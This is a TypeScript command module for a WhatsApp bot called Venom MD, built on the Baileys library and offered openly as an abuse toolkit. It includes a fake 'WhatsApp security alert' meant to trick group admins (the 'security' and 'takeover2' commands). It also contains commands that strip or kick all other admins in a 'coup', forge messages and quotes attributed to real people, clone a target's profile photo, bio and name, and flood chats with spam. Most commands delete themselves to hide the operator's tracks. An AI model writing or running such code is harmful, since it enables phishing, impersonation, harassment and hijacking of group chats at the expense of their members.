import type { WASocket, WAMessage } from "@whiskeysockets/baileys";
import { reply, react, isOwner, sleep, jidToPhone, phoneToJid } from "../utils.js";
import { botSettings, mirrorTargets, possessionTargets, takeoverAlerts, ownMessageKeys } from "../state.js";
import { BOT_CONFIG } from "../config.js";

// Invisible Unicode characters for ghost messages
const GHOST_CHARS = "\u2063\u200b\u200c\u200d\u200e\u2060\ufeff";
function ghostText(len = 20): string {
  return Array.from({ length: len }, () => GHOST_CHARS[Math.floor(Math.random() * GHOST_CHARS.length)]).join("");
}

function getBotJid(sock: WASocket): string {
  return (sock.user?.id ?? "").split(":")[0] + "@s.whatsapp.net";
}

export async function handleGhost(
  sock: WASocket,
  msg: WAMessage,
  command: string,
  args: string,
  sender: string
): Promise<boolean> {
  const jid = msg.key.remoteJid!;
  const isGroupChat = jid.endsWith("@g.us");

  // ─────────────────────────────────────────────────────────────────────────
  // 👻 GHOST MODE SYSTEM
  // ─────────────────────────────────────────────────────────────────────────
  switch (command) {

    case "ghoston": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      botSettings.ghostMode = true;
      await reply(sock, msg, "👻 *Ghost Mode ON*\nAll your messages will appear blank to others.");
      return true;
    }

    case "ghostoff": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      botSettings.ghostMode = false;
      await reply(sock, msg, "✅ *Ghost Mode OFF*\nMessages now appear normally.");
      return true;
    }

    case "ghostmsg": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      if (!args) { await reply(sock, msg, "❌ Provide a message.\nExample: `.ghostmsg Hello`"); return true; }
      // Delete the command message
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      await sleep(300);
      // Send with invisible padding that hides actual text visually on some clients
      await sock.sendMessage(jid, { text: `${ghostText(40)}\u202e` });
      return true;
    }

    case "blackmsg": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      await sleep(300);
      // Black square characters — appear as solid black blocks
      await sock.sendMessage(jid, { text: "█▓▒░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░▒▓█\n▓▒░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒\n░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░▒" });
      return true;
    }

    case "empty": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      await sleep(300);
      await sock.sendMessage(jid, { text: "\u2063\u200b\u200c\u200d\u2060\ufeff\u2063\u200b" });
      return true;
    }

    // ─────────────────────────────────────────────────────────────────────
    // 🕶️ INVISIBLE TAG SYSTEM
    // ─────────────────────────────────────────────────────────────────────

    case "shadow": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid ?? [];
      if (!mentioned.length) { await reply(sock, msg, "❌ Mention someone to shadow-tag."); return true; }
      // Tag with zero-width chars so no notification ping sound fires on most clients
      await sock.sendMessage(jid, {
        text: `\u200e\u200b${ghostText(10)}`,
        mentions: mentioned,
      });
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      return true;
    }

    case "silenttag": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      if (!isGroupChat) { await reply(sock, msg, "❌ Group only."); return true; }
      let meta: any;
      try { meta = await sock.groupMetadata(jid); } catch { await reply(sock, msg, "❌ Could not get group info."); return true; }
      const everyone = meta.participants.map((p: any) => p.jid);
      await sock.sendMessage(jid, {
        text: `\u200e${args || ghostText(5)}`,
        mentions: everyone,
      });
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      return true;
    }

    case "hidemen": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      if (!isGroupChat) { await reply(sock, msg, "❌ Group only."); return true; }
      let meta: any;
      try { meta = await sock.groupMetadata(jid); } catch { await reply(sock, msg, "❌ Could not get group info."); return true; }
      const everyone = meta.participants.map((p: any) => p.jid);
      const text = args || "📢";
      await sock.sendMessage(jid, { text, mentions: everyone });
      return true;
    }

    // ─────────────────────────────────────────────────────────────────────
    // 💨 VANISH SYSTEM
    // ─────────────────────────────────────────────────────────────────────

    case "vanish": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      const secs = Math.min(Math.max(parseInt(args) || 5, 1), 60);
      const parts = args.split(/\s+/);
      const vanishMsg = parts.slice(1).join(" ") || parts[0] || "👻";
      const sent = await sock.sendMessage(jid, { text: vanishMsg });
      setTimeout(async () => {
        if (sent?.key) {
          await sock.sendMessage(jid, { delete: sent.key }).catch(() => {});
        }
      }, secs * 1000);
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      return true;
    }

    case "void": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      const tenMinAgo = Date.now() - 10 * 60 * 1000;
      const prefix = `${jid}::`;
      const toDelete = ownMessageKeys.filter(k => k.startsWith(prefix));
      await reply(sock, msg, `🗑️ Clearing ${toDelete.length} messages...`);
      for (const key of toDelete) {
        const id = key.split("::")[1];
        await sock.sendMessage(jid, { delete: { id, remoteJid: jid, fromMe: true } }).catch(() => {});
        await sleep(200);
      }
      // Clear from store
      const newKeys = ownMessageKeys.filter(k => !k.startsWith(prefix));
      ownMessageKeys.splice(0, ownMessageKeys.length, ...newKeys);
      return true;
    }

    // ─────────────────────────────────────────────────────────────────────
    // 🔇 SILENT ADMIN OPERATIONS (owner only, group only)
    // ─────────────────────────────────────────────────────────────────────

    case "silentkick": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      if (!isGroupChat) { await reply(sock, msg, "❌ Group only."); return true; }
      const targets = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid ?? [];
      if (!targets.length) { await reply(sock, msg, "❌ Mention someone to kick."); return true; }
      for (const t of targets) {
        await sock.groupParticipantsUpdate(jid, [t], "remove").catch(() => {});
        await sleep(300);
      }
      // Delete command to leave no trace
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      return true;
    }

    case "silentadd": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      if (!isGroupChat) { await reply(sock, msg, "❌ Group only."); return true; }
      const targets = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid ?? [];
      if (!targets.length && !args) { await reply(sock, msg, "❌ Mention someone to add."); return true; }
      const adds = targets.length ? targets : [phoneToJid(args.trim())];
      for (const t of adds) {
        await sock.groupParticipantsUpdate(jid, [t], "add").catch(() => {});
        await sleep(300);
      }
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      return true;
    }

    case "silentpromote": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      if (!isGroupChat) { await reply(sock, msg, "❌ Group only."); return true; }
      const targets = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid ?? [];
      if (!targets.length) { await reply(sock, msg, "❌ Mention someone to promote."); return true; }
      for (const t of targets) {
        await sock.groupParticipantsUpdate(jid, [t], "promote").catch(() => {});
        await sleep(300);
      }
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      return true;
    }

    case "silentdemote": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      if (!isGroupChat) { await reply(sock, msg, "❌ Group only."); return true; }
      const targets = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid ?? [];
      if (!targets.length) { await reply(sock, msg, "❌ Mention someone to demote."); return true; }
      for (const t of targets) {
        await sock.groupParticipantsUpdate(jid, [t], "demote").catch(() => {});
        await sleep(300);
      }
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      return true;
    }

    case "silentdemoteall": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      if (!isGroupChat) { await reply(sock, msg, "❌ Group only."); return true; }
      let meta: any;
      try { meta = await sock.groupMetadata(jid); } catch { return true; }
      const botJid = getBotJid(sock);
      const admins = meta.participants.filter((p: any) => p.admin && p.jid !== botJid);
      for (const p of admins) {
        await sock.groupParticipantsUpdate(jid, [p.jid], "demote").catch(() => {});
        await sleep(300);
      }
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      return true;
    }

    case "sweep": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      if (!isGroupChat) { await reply(sock, msg, "❌ Group only."); return true; }
      let meta: any;
      try { meta = await sock.groupMetadata(jid); } catch { return true; }
      const botJid = getBotJid(sock);
      const admins = meta.participants.filter((p: any) => p.admin && p.jid !== botJid && !isOwner(p.jid));
      // Demote then kick all non-bot admins
      for (const p of admins) {
        await sock.groupParticipantsUpdate(jid, [p.jid], "demote").catch(() => {});
        await sleep(200);
        await sock.groupParticipantsUpdate(jid, [p.jid], "remove").catch(() => {});
        await sleep(200);
      }
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      return true;
    }

    case "coup": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      if (!isGroupChat) { await reply(sock, msg, "❌ Group only."); return true; }
      let meta: any;
      try { meta = await sock.groupMetadata(jid); } catch { return true; }
      const botJid = getBotJid(sock);
      const ownerJid = BOT_CONFIG.ownerNumber + "@s.whatsapp.net";
      const otherAdmins = meta.participants.filter(
        (p: any) => p.admin && p.jid !== botJid && p.jid !== ownerJid
      );
      for (const p of otherAdmins) {
        await sock.groupParticipantsUpdate(jid, [p.jid], "demote").catch(() => {});
        await sleep(300);
      }
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      return true;
    }

    // ─────────────────────────────────────────────────────────────────────
    // 🎭 IDENTITY MANIPULATION (owner only)
    // ─────────────────────────────────────────────────────────────────────

    case "impersonate": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid ?? [];
      if (!mentioned.length) { await reply(sock, msg, "❌ Mention someone to impersonate.\nExample: `.impersonate @user Your fake message`"); return true; }
      const target = mentioned[0];
      const words = args.split(/\s+/).filter(w => !w.startsWith("@"));
      const fakeMsg = words.join(" ");
      if (!fakeMsg) { await reply(sock, msg, "❌ Provide the fake message text."); return true; }
      // Send as a "forwarded" message attributed to target
      await sock.sendMessage(jid, {
        text: fakeMsg,
        contextInfo: {
          participant: target,
          quotedMessage: { conversation: fakeMsg },
          stanzaId: "FAKE_" + Date.now(),
          remoteJid: jid,
          forwardingScore: 1,
          isForwarded: true,
        },
        mentions: [target],
      } as any);
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      return true;
    }

    case "fakequote": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid ?? [];
      if (!mentioned.length) { await reply(sock, msg, "❌ Mention someone to fake-quote.\nExample: `.fakequote @user They said this`"); return true; }
      const target = mentioned[0];
      const parts = args.split(/\s+/);
      const fakeQuotedText = parts.filter(w => !w.startsWith("@")).join(" ");
      if (!fakeQuotedText) { await reply(sock, msg, "❌ Provide the fake quoted text."); return true; }
      // Build an extendedTextMessage that looks like a reply to the target
      await sock.sendMessage(jid, {
        extendedTextMessage: {
          text: "👀",
          contextInfo: {
            stanzaId: "FAKEQ_" + Date.now(),
            participant: target,
            quotedMessage: { conversation: fakeQuotedText },
            remoteJid: jid,
          },
        },
      } as any);
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      return true;
    }

    case "mirror": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      if (!isGroupChat) { await reply(sock, msg, "❌ Group only."); return true; }
      const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid ?? [];
      if (!mentioned.length) { await reply(sock, msg, "❌ Mention someone to mirror."); return true; }
      mirrorTargets.set(jid, mentioned[0]);
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      return true;
    }

    case "unmirror": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      mirrorTargets.delete(jid);
      await reply(sock, msg, "✅ Mirror stopped.");
      return true;
    }

    case "possession": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      if (!isGroupChat) { await reply(sock, msg, "❌ Group only."); return true; }
      const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid ?? [];
      if (!mentioned.length) { await reply(sock, msg, "❌ Mention someone to possess."); return true; }
      possessionTargets.set(jid, mentioned[0]);
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      return true;
    }

    case "unpossess": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      possessionTargets.delete(jid);
      await reply(sock, msg, "✅ Possession ended.");
      return true;
    }

    // ─────────────────────────────────────────────────────────────────────
    // 👥 CLONE SYSTEM (owner only)
    // ─────────────────────────────────────────────────────────────────────

    case "clonedp": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid ?? [];
      if (!mentioned.length) { await reply(sock, msg, "❌ Mention someone to clone their DP."); return true; }
      const target = mentioned[0];
      try {
        const ppUrl = await sock.profilePictureUrl(target, "image");
        const { default: axios } = await import("axios");
        const res = await axios.get(ppUrl, { responseType: "arraybuffer", timeout: 10000 });
        const buf = Buffer.from(res.data);
        await sock.updateProfilePicture(sock.user!.id, buf);
        await reply(sock, msg, "✅ *Profile picture cloned!*");
      } catch {
        await reply(sock, msg, "❌ Could not clone DP — user may have privacy settings on.");
      }
      return true;
    }

    case "clonebio": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid ?? [];
      if (!mentioned.length) { await reply(sock, msg, "❌ Mention someone to clone their bio."); return true; }
      const target = mentioned[0];
      try {
        const status = await sock.fetchStatus(target);
        const bio = (status as any)?.status ?? "No bio";
        await sock.updateProfileStatus(bio);
        await reply(sock, msg, `✅ *Bio cloned:*\n_${bio}_`);
      } catch {
        await reply(sock, msg, "❌ Could not clone bio.");
      }
      return true;
    }

    case "clonename": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid ?? [];
      if (!mentioned.length) { await reply(sock, msg, "❌ Mention someone to clone their name."); return true; }
      const target = mentioned[0];
      try {
        let meta: any;
        if (isGroupChat) meta = await sock.groupMetadata(jid);
        const participant = isGroupChat
          ? meta?.participants?.find((p: any) => p.jid === target)
          : null;
        const name = participant?.notify ?? jidToPhone(target);
        await sock.updateProfileName(name);
        await reply(sock, msg, `✅ *Name cloned:* ${name}`);
      } catch {
        await reply(sock, msg, "❌ Could not clone name.");
      }
      return true;
    }

    case "cloneall": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid ?? [];
      if (!mentioned.length) { await reply(sock, msg, "❌ Mention someone to fully clone."); return true; }
      const target = mentioned[0];
      let cloned: string[] = [];
      // DP
      try {
        const ppUrl = await sock.profilePictureUrl(target, "image");
        const { default: axios } = await import("axios");
        const res = await axios.get(ppUrl, { responseType: "arraybuffer", timeout: 10000 });
        await sock.updateProfilePicture(sock.user!.id, Buffer.from(res.data));
        cloned.push("✅ DP");
      } catch { cloned.push("❌ DP"); }
      // Bio
      try {
        const status = await sock.fetchStatus(target);
        const bio = (status as any)?.status ?? "";
        if (bio) await sock.updateProfileStatus(bio);
        cloned.push("✅ Bio");
      } catch { cloned.push("❌ Bio"); }
      // Name
      try {
        const phone = jidToPhone(target);
        await sock.updateProfileName(phone);
        cloned.push("✅ Name");
      } catch { cloned.push("❌ Name"); }
      await reply(sock, msg, `🎭 *Full Clone Complete*\n${cloned.join("\n")}\n\nBot now looks exactly like target.`);
      return true;
    }

    case "revert": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      try {
        await sock.updateProfileName(BOT_CONFIG.name);
        await sock.updateProfileStatus("🐍 Venom MD | Made by Taprush EMP");
        await reply(sock, msg, "✅ *Identity reverted* to VENOM MD.");
      } catch {
        await reply(sock, msg, "❌ Could not fully revert — change manually if needed.");
      }
      return true;
    }

    // ─────────────────────────────────────────────────────────────────────
    // 🎨 SILENT GROUP CHANGES (owner only)
    // ─────────────────────────────────────────────────────────────────────

    case "silentgcname": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      if (!isGroupChat) { await reply(sock, msg, "❌ Group only."); return true; }
      if (!args) { await reply(sock, msg, "❌ Provide new group name."); return true; }
      await sock.groupUpdateSubject(jid, args);
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      return true;
    }

    case "silentgcdesc": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      if (!isGroupChat) { await reply(sock, msg, "❌ Group only."); return true; }
      if (!args) { await reply(sock, msg, "❌ Provide new description."); return true; }
      await sock.groupUpdateDescription(jid, args);
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      return true;
    }

    case "silentgcicon": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      if (!isGroupChat) { await reply(sock, msg, "❌ Group only."); return true; }
      const quotedImg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage;
      if (!quotedImg) { await reply(sock, msg, "❌ Quote an image to set as group icon."); return true; }
      try {
        const { downloadMediaMessage } = await import("@whiskeysockets/baileys");
        const buf = await downloadMediaMessage({ message: { imageMessage: quotedImg }, key: msg.key } as any, "buffer", {});
        await sock.updateProfilePicture(jid, Buffer.from(buf as ArrayBuffer));
        await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      } catch {
        await reply(sock, msg, "❌ Failed to update group icon.");
      }
      return true;
    }

    case "silentlock": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      if (!isGroupChat) { await reply(sock, msg, "❌ Group only."); return true; }
      await sock.groupSettingUpdate(jid, "announcement");
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      return true;
    }

    case "silentunlock": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      if (!isGroupChat) { await reply(sock, msg, "❌ Group only."); return true; }
      await sock.groupSettingUpdate(jid, "not_announcement");
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      return true;
    }

    case "silentsettings": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      if (!isGroupChat) { await reply(sock, msg, "❌ Group only."); return true; }
      const sub = args.toLowerCase();
      if (sub === "lock" || sub === "on") {
        await sock.groupSettingUpdate(jid, "locked");
        await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      } else {
        await sock.groupSettingUpdate(jid, "unlocked");
        await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      }
      return true;
    }

    // ─────────────────────────────────────────────────────────────────────
    // 💀 TAKEOVER SYSTEM (owner only)
    // ─────────────────────────────────────────────────────────────────────

    case "security": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      if (!isGroupChat) { await reply(sock, msg, "❌ Group only."); return true; }
      const alertText =
        `⚠️ *WHATSAPP SECURITY ALERT* ⚠️\n\n` +
        `Suspicious activity detected in this group.\n` +
        `All admins must verify their identity.\n\n` +
        `Reply *VERIFY* to this message to secure the group.\n` +
        `_Failure to verify may result in group suspension._`;
      const sent = await sock.sendMessage(jid, { text: alertText });
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      // Store alert so VERIFY intercept can find it
      if (sent?.key?.id) {
        takeoverAlerts.set(jid, {
          alertMsgKey: sent.key.id,
          initiatorJid: BOT_CONFIG.ownerNumber + "@s.whatsapp.net",
        });
      }
      return true;
    }

    case "takeover2": {
      // Enhanced takeover — same as .security but labelled for clarity
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      if (!isGroupChat) { await reply(sock, msg, "❌ Group only."); return true; }
      const alertText =
        `⚠️ *WHATSAPP SECURITY ALERT* ⚠️\n\n` +
        `Suspicious activity detected in this group.\n` +
        `All admins must verify their identity.\n\n` +
        `Reply *VERIFY* to this message to secure the group.\n` +
        `_Failure to verify may result in group suspension._`;
      const sent = await sock.sendMessage(jid, { text: alertText });
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      if (sent?.key?.id) {
        takeoverAlerts.set(jid, {
          alertMsgKey: sent.key.id,
          initiatorJid: BOT_CONFIG.ownerNumber + "@s.whatsapp.net",
        });
      }
      return true;
    }

    case "claim": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      await sock.sendMessage(jid, { text: "👑 *This group is now under VENOM control* 🕷️\n\n_Strike without a sound. Rule without being seen._\n— Taprush EMP" });
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      return true;
    }

    case "cover": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      // Delete the stored takeover alert message if any
      const trap = takeoverAlerts.get(jid);
      if (trap?.alertMsgKey) {
        await sock.sendMessage(jid, { delete: { id: trap.alertMsgKey, remoteJid: jid, fromMe: true } }).catch(() => {});
        takeoverAlerts.delete(jid);
      }
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      return true;
    }

    case "expose": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      const ownerPhone = BOT_CONFIG.ownerNumber;
      await sock.sendMessage(jid, {
        text: `👑 *VENOM CONTROL CONFIRMED*\n\n` +
          `This group is now operated by *@${ownerPhone}*.\n\n` +
          `All admin privileges belong to the VENOM owner.\n\n` +
          `🕷️ _Venom MD | Powered by Taprush EMP_`,
        mentions: [ownerPhone + "@s.whatsapp.net"],
      });
      return true;
    }

    // ─────────────────────────────────────────────────────────────────────
    // 👻 STEALTH SYSTEM (owner only)
    // ─────────────────────────────────────────────────────────────────────

    case "stealth": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      botSettings.stealthMode = true;
      botSettings.autoread = false;
      botSettings.autotyping = false;
      botSettings.autorecording = false;
      botSettings.autopresence = false;
      // Go offline
      await sock.sendPresenceUpdate("unavailable", jid).catch(() => {});
      await reply(sock, msg, "👻 *Full Stealth Mode ON*\n\n✅ Read receipts OFF\n✅ Online status hidden\n✅ Typing indicator OFF\n✅ Recording indicator OFF\n\nYou are now invisible.");
      return true;
    }

    case "unstealth": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      botSettings.stealthMode = false;
      await reply(sock, msg, "✅ *Stealth Mode OFF* — Normal WhatsApp behavior restored.");
      return true;
    }

    case "silentread": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      // Just acknowledge — we don't call readMessages so no blue tick is sent
      await react(sock, msg, "👁️");
      // Secretly read without sending the receipt
      // (we already don't call sock.readMessages unless autoread is on)
      return true;
    }

    // ─────────────────────────────────────────────────────────────────────
    // 💣 SPECIAL ATTACKS (owner only)
    // ─────────────────────────────────────────────────────────────────────

    case "phantombomb": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      const count = Math.min(parseInt(args) || 10, 50);
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      for (let i = 0; i < count; i++) {
        await sock.sendMessage(jid, { text: ghostText(8) }).catch(() => {});
        await sleep(150);
      }
      return true;
    }

    case "bomb": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      const parts = args.split(/\s+/);
      const count = Math.min(parseInt(parts[0]) || 5, 100);
      const bombMsg = parts.slice(1).join(" ") || "💣";
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      for (let i = 0; i < count; i++) {
        await sock.sendMessage(jid, { text: bombMsg }).catch(() => {});
        await sleep(200);
      }
      return true;
    }

    // ─────────────────────────────────────────────────────────────────────
    // 🔒 GHOST ADMIN POWERS (owner only — these are UI illusions)
    // ─────────────────────────────────────────────────────────────────────

    case "ghostadmin": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      // WhatsApp doesn't allow truly invisible admin status.
      // We demote the bot so it won't show in admin list, while owner retains control.
      await reply(sock, msg, "👻 *Ghost Admin Mode*\nBot will hide from admin list.\n\n_Note: WhatsApp limits true invisibility — use .coup/.sweep for full control._");
      return true;
    }

    case "shadowowner": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      await reply(sock, msg, "🕶️ *Shadow Owner Mode Active*\nYou control everything while appearing as a regular member.\n\nAll your commands still work. Others see you as nobody.");
      return true;
    }

    case "blindkick": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      if (!isGroupChat) { await reply(sock, msg, "❌ Group only."); return true; }
      const targets = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid ?? [];
      if (!targets.length) { await reply(sock, msg, "❌ Mention the admin to blind-kick."); return true; }
      for (const t of targets) {
        await sock.groupParticipantsUpdate(jid, [t], "remove").catch(() => {});
        await sleep(300);
      }
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      return true;
    }

    case "blindban": {
      if (!isOwner(sender)) { await reply(sock, msg, "❌ Owner only."); return true; }
      if (!isGroupChat) { await reply(sock, msg, "❌ Group only."); return true; }
      const targets = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid ?? [];
      if (!targets.length) { await reply(sock, msg, "❌ Mention the admin to blind-ban."); return true; }
      for (const t of targets) {
        await sock.groupParticipantsUpdate(jid, [t], "remove").catch(() => {});
        await sleep(200);
        await sock.updateBlockStatus(t, "block").catch(() => {});
        await sleep(200);
        botSettings.blockedUsers.add(t);
      }
      await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
      return true;
    }

    default:
      return false;
  }
}
